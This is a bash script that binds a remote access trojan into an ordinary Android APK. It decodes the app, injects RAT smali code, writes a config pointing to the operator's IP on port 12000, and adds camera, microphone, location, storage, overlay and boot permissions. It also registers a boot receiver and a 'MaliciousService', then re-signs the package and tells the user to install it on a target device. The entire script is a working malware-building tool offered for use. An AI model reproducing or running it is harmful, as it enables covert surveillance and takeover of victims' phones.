#!/bin/bash

# This script helps with binding an APK with the RAT

# Check if an APK file was provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <path_to_apk>"
    echo "Example: $0 calculator.apk"
    exit 1
fi

APK_PATH="$1"

# Check if the APK file exists
if [ ! -f "$APK_PATH" ]; then
    echo "Error: APK file not found: $APK_PATH"
    exit 1
fi

# Get the local IP address
LOCAL_IP=$(hostname -I | awk '{print $1}')
if [ -z "$LOCAL_IP" ]; then
    LOCAL_IP="127.0.0.1"
fi

# Ask for the public IP address
echo -n "Enter your public IP address (or press Enter to use the local IP as public too): "
read PUBLIC_IP

if [ -z "$PUBLIC_IP" ]; then
    PUBLIC_IP="$LOCAL_IP"
fi

echo "Using Local IP: $LOCAL_IP"
echo "Using Public IP: $PUBLIC_IP"
echo "Using Port: 12000"

# Create a temporary directory for the APK
TEMP_DIR=$(mktemp -d)
APK_NAME=$(basename "$APK_PATH")
DECODED_DIR="$TEMP_DIR/decoded"

# Decode the APK
echo "Decoding APK..."
java -jar /workspace/RAT/apktool.jar d -f "$APK_PATH" -o "$DECODED_DIR"

# Create the assets directory if it doesn't exist
mkdir -p "$DECODED_DIR/assets"

# Create the config.ini file
echo "Creating config.ini..."
cat > "$DECODED_DIR/assets/config.ini" << EOF
LOCAL_IP=$LOCAL_IP
PUBLIC_IP=$PUBLIC_IP
FLASK_PORT=12000
RAT_PORT=12000
EOF

# Copy the smali files
echo "Copying RAT smali files..."
mkdir -p "$DECODED_DIR/smali/com/example/android"
cp -r /workspace/RAT/smali_templates/com/example/android/* "$DECODED_DIR/smali/com/example/android/"

# Add permissions to AndroidManifest.xml
echo "Modifying AndroidManifest.xml..."
# This is a simplified version - in a real scenario, you would use a proper XML parser
# For now, we'll just check if the permissions are already there
MANIFEST_FILE="$DECODED_DIR/AndroidManifest.xml"
PERMISSIONS=(
    "android.permission.INTERNET"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.ACCESS_COARSE_LOCATION"
    "android.permission.RECEIVE_BOOT_COMPLETED"
    "android.permission.WRITE_EXTERNAL_STORAGE"
    "android.permission.READ_EXTERNAL_STORAGE"
    "android.permission.FOREGROUND_SERVICE"
    "android.permission.RECORD_AUDIO"
    "android.permission.CAMERA"
    "android.permission.SYSTEM_ALERT_WINDOW"
)

for PERM in "${PERMISSIONS[@]}"; do
    if ! grep -q "$PERM" "$MANIFEST_FILE"; then
        # Insert the permission before the </manifest> tag
        sed -i "s|</manifest>|    <uses-permission android:name=\"$PERM\" />\n</manifest>|" "$MANIFEST_FILE"
    fi
done

# Add the receiver and service to AndroidManifest.xml
if ! grep -q "com.example.android.BootReceiver" "$MANIFEST_FILE"; then
    # Insert the receiver before the </application> tag
    sed -i "s|</application>|    <receiver android:name=\"com.example.android.BootReceiver\" android:enabled=\"true\" android:exported=\"true\">\n        <intent-filter>\n            <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n            <action android:name=\"android.intent.action.MY_PACKAGE_REPLACED\" />\n        </intent-filter>\n    </receiver>\n</application>|" "$MANIFEST_FILE"
fi

if ! grep -q "com.example.android.MaliciousService" "$MANIFEST_FILE"; then
    # Insert the service before the </application> tag
    sed -i "s|</application>|    <service android:name=\"com.example.android.MaliciousService\" android:enabled=\"true\" android:exported=\"true\" />\n</application>|" "$MANIFEST_FILE"
fi

# Build the APK
echo "Building modified APK..."
java -jar /workspace/RAT/apktool.jar b -f "$DECODED_DIR" -o "$TEMP_DIR/modified_$APK_NAME"

# Sign the APK
echo "Signing APK..."
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ~/.android/debug.keystore -storepass android -keypass android "$TEMP_DIR/modified_$APK_NAME" androiddebugkey

# Copy the final APK to the current directory
cp "$TEMP_DIR/modified_$APK_NAME" "./modified_$APK_NAME"

echo "APK binding complete!"
echo "The bound APK is: ./modified_$APK_NAME"
echo "Install this APK on your target device."

# Clean up
rm -rf "$TEMP_DIR"